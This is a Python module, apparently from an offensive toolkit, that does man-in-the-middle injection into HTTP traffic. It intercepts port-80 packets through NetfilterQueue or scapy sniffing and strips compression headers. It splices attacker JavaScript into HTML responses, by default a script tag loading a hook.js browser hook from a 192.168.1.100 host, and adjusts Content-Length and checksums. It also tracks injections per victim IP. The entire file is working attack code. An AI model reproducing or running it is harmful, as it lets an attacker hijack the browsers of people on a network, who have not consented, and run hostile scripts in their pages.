from __future__ import annotations

import os
import re
import threading
import time
from pathlib import Path
from typing import Optional, Callable, Union

import scapy.all as scapy
from loguru import logger


class CodeInjector:

    def __init__(
        self,
        interface: str,
        injection_code: str = '<script src="http://192.168.1.100:3000/hook.js"></script>',
        injection_mode: str = "append",
        url_filter: Optional[str] = None,
    ):
        self._interface = interface
        self._injection_code = injection_code
        self._injection_mode = injection_mode
        self._url_filter = re.compile(url_filter) if url_filter else None
        self._running = False
        self._stats = {"injected": 0, "scanned": 0, "skipped": 0, "filtered": 0, "errors": 0}
        self._target_stats: dict[str, int] = {}
        self._lock = threading.Lock()
        self._callbacks: list[Callable] = []

        self._content_length_re = re.compile(rb"(?:Content-Length:\s*)(\d+)", re.IGNORECASE)
        self._content_type_re = re.compile(rb"Content-Type:\s*text/html", re.IGNORECASE)
        self._accept_encoding_re = re.compile(rb"Accept-Encoding:.*?\r\n", re.IGNORECASE)
        self._transfer_encoding_re = re.compile(rb"Transfer-Encoding:\s*chunked", re.IGNORECASE)
        self._body_close_re = re.compile(rb"</body\s*>", re.IGNORECASE)
        self._head_close_re = re.compile(rb"</head\s*>", re.IGNORECASE)
        self._host_re = re.compile(rb"Host:\s*([^\r\n]+)", re.IGNORECASE)
        self._path_re = re.compile(rb"(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+([^\s?]+)", re.IGNORECASE)

    @property
    def stats(self) -> dict:
        with self._lock:
            s = dict(self._stats)
            s["targets"] = dict(self._target_stats)
        return s

    def on_inject(self, callback: Callable) -> None:
        self._callbacks.append(callback)

    def set_payload(self, code: str) -> None:
        self._injection_code = code
        logger.info(f"payload updated ({len(code)}B)")

    def load_payload_file(self, path: Union[str, Path]) -> bool:
        p = Path(path)
        if not p.exists():
            logger.error(f"payload file not found: {path}")
            return False
        try:
            code = p.read_text(encoding="utf-8")
            self._injection_code = code
            logger.info(f"payload loaded from {p.name} ({len(code)}B)")
            return True
        except Exception as e:
            logger.error(f"failed to read payload file: {e}")
            return False

    def _should_inject(self, http_response: bytes) -> bool:
        if self._content_type_re.search(http_response) is None:
            return False

        if self._transfer_encoding_re.search(http_response):
            return False

        if self._injection_mode == "append":
            if not self._body_close_re.search(http_response):
                return False
        elif self._injection_mode == "head":
            if not self._head_close_re.search(http_response):
                return False

        if self._url_filter:
            if not self._url_filter.search(http_response.decode("utf-8", errors="replace")):
                return False

        return True

    def inject_into(self, raw_packet: bytes, src_ip: str, dst_ip: str, dst_port: int = 0) -> Optional[bytes]:
        with self._lock:
            self._stats["scanned"] += 1

        try:
            if not self._should_inject(raw_packet):
                with self._lock:
                    self._stats["skipped"] += 1
                return None

            load = raw_packet
            load = self._accept_encoding_re.sub(b"", load)
            injection = self._injection_code.encode("utf-8")

            if self._injection_mode == "append":
                if self._body_close_re.search(load):
                    load = self._body_close_re.sub(injection + b"</body>", load, count=1)
                else:
                    return None
            elif self._injection_mode == "head":
                if self._head_close_re.search(load):
                    load = self._head_close_re.sub(injection + b"</head>", load, count=1)
                else:
                    return None
            elif self._injection_mode == "prepend":
                header_end = load.find(b"\r\n\r\n")
                if header_end == -1:
                    return None
                load = load[:header_end + 4] + injection + load[header_end + 4:]

            content_length_match = self._content_length_re.search(load)
            if content_length_match:
                try:
                    old_len = int(content_length_match.group(1))
                    new_len = old_len + len(injection)
                    load = load.replace(
                        content_length_match.group(0),
                        f"Content-Length: {new_len}".encode("utf-8"),
                        1,
                    )
                except (ValueError, IndexError):
                    pass

            with self._lock:
                self._stats["injected"] += 1
                self._target_stats[src_ip] = self._target_stats.get(src_ip, 0) + 1

            host = self._host_re.search(raw_packet)
            path = self._path_re.search(raw_packet)
            target_url = ""
            if host and path:
                target_url = f"{host.group(1).decode(errors='replace')}{path.group(1).decode(errors='replace')}"

            logger.debug(f"injected {len(injection)}B into {src_ip}:{dst_port} {target_url}")

            for cb in self._callbacks:
                try:
                    cb(src_ip=src_ip, dst_ip=dst_ip, size=len(injection), url=target_url)
                except Exception:
                    pass

            return load

        except Exception as e:
            with self._lock:
                self._stats["errors"] += 1
            logger.debug(f"inject error: {e}")
            return None

    def stop(self) -> None:
        self._running = False
        log = logger.info
        log(f"injector stats: scanned={self._stats['scanned']} "
            f"injected={self._stats['injected']} skipped={self._stats['skipped']} errors={self._stats['errors']}")
        if self._target_stats:
            for ip, cnt in sorted(self._target_stats.items(), key=lambda x: -x[1])[:10]:
                log(f"  {ip}: {cnt} injections")


class NfqueueHTTPInjector(CodeInjector):

    def __init__(self, interface: str, injection_code: str = '<script>alert(1)</script>',
                 injection_mode: str = "append", queue_num: int = 0,
                 url_filter: Optional[str] = None):
        super().__init__(interface, injection_code, injection_mode, url_filter)
        self._queue_num = queue_num
        self._queue: Optional[object] = None
        self._nfqueue_thread: Optional[threading.Thread] = None

    def _process_packet(self, packet) -> None:
        try:
            scapy_pkt = scapy.IP(packet.get_payload())
            if not scapy_pkt.haslayer(scapy.Raw) or not scapy_pkt.haslayer(scapy.TCP):
                packet.accept()
                return

            tcp = scapy_pkt[scapy.TCP]
            if tcp.dport != 80 and tcp.sport != 80:
                packet.accept()
                return

            raw = bytes(scapy_pkt[scapy.Raw])

            if tcp.dport == 80:
                modified = self._accept_encoding_re.sub(b"", raw)
                if modified != raw:
                    scapy_pkt[scapy.Raw].load = modified
                    del scapy_pkt[scapy.IP].len
                    del scapy_pkt[scapy.IP].chksum
                    del scapy_pkt[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_pkt))

            elif tcp.sport == 80:
                ip = scapy_pkt[scapy.IP]
                modified = self.inject_into(raw, ip.dst, ip.src, tcp.dport)
                if modified is not None:
                    scapy_pkt[scapy.Raw].load = modified
                    del scapy_pkt[scapy.IP].len
                    del scapy_pkt[scapy.IP].chksum
                    del scapy_pkt[scapy.TCP].chksum
                    packet.set_payload(bytes(scapy_pkt))

            packet.accept()

        except Exception as e:
            logger.debug(f"nfqueue inject error: {e}")
            with self._lock:
                self._stats["errors"] += 1
            try:
                packet.accept()
            except Exception:
                pass

    def start(self) -> None:
        self._running = True
        try:
            from netfilterqueue import NetfilterQueue
            self._queue = NetfilterQueue()
            self._queue.bind(self._queue_num, self._process_packet)

            self._nfqueue_thread = threading.Thread(target=self._queue.run, daemon=True)
            self._nfqueue_thread.start()
            logger.info(
                f"nfqueue injector running (queue={self._queue_num}, "
                f"payload={len(self._injection_code)}B, "
                f"mode={self._injection_mode})"
            )
            logger.info("ensure iptables rule: sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")
        except ImportError:
            logger.error("netfilterqueue not installed. run: pip install NetfilterQueue")
            self._running = False
        except PermissionError:
            logger.error("root required for netfilterqueue")
            self._running = False
        except OSError as e:
            logger.error(f"nfqueue bind failed: {e}")
            self._running = False

    def stop(self) -> None:
        self._running = False
        if self._queue:
            try:
                self._queue.unbind()
            except Exception:
                pass
        super().stop()


class ScapyHTTPInjector(CodeInjector):

    def __init__(self, interface: str, injection_code: str = '<script>alert(1)</script>',
                 injection_mode: str = "append", url_filter: Optional[str] = None):
        super().__init__(interface, injection_code, injection_mode, url_filter)
        self._sniff_thread: Optional[threading.Thread] = None

    def _handle_http(self, packet) -> None:
        try:
            if not packet.haslayer(scapy.Raw) or not packet.haslayer(scapy.TCP):
                return

            tcp = packet[scapy.TCP]
            if tcp.sport != 80:
                return

            raw = bytes(packet[scapy.Raw])
            ip = packet[scapy.IP]

            modified = self.inject_into(raw, ip.dst, ip.src, tcp.dport)
            if modified is None:
                return

            try:
                injected_pkt = (
                    scapy.IP(src=ip.src, dst=ip.dst, flags=ip.flags, frag=ip.frag)
                    / scapy.TCP(
                        sport=tcp.sport, dport=tcp.dport,
                        seq=tcp.seq + len(raw), ack=tcp.ack,
                        flags=tcp.flags & 0x17, window=tcp.window,
                    )
                    / scapy.Raw(load=modified)
                )
                scapy.sendp(scapy.Ether() / injected_pkt, iface=self._interface, verbose=False)

            except Exception as e:
                logger.debug(f"scapy inject send failed: {e}")
                with self._lock:
                    self._stats["errors"] += 1

        except Exception:
            pass

    def start(self) -> None:
        self._running = True

        def sniff_loop():
            try:
                scapy.sniff(
                    iface=self._interface,
                    filter="tcp port 80",
                    prn=self._handle_http,
                    store=False,
                    stop_filter=lambda _: not self._running,
                )
            except Exception as e:
                if self._running:
                    logger.error(f"scapy injector sniff error: {e}")

        self._sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        self._sniff_thread.start()
        logger.info(
            f"scapy injector started ({len(self._injection_code)}B payload, "
            f"mode={self._injection_mode})"
        )

    def stop(self) -> None:
        self._running = False
        super().stop()
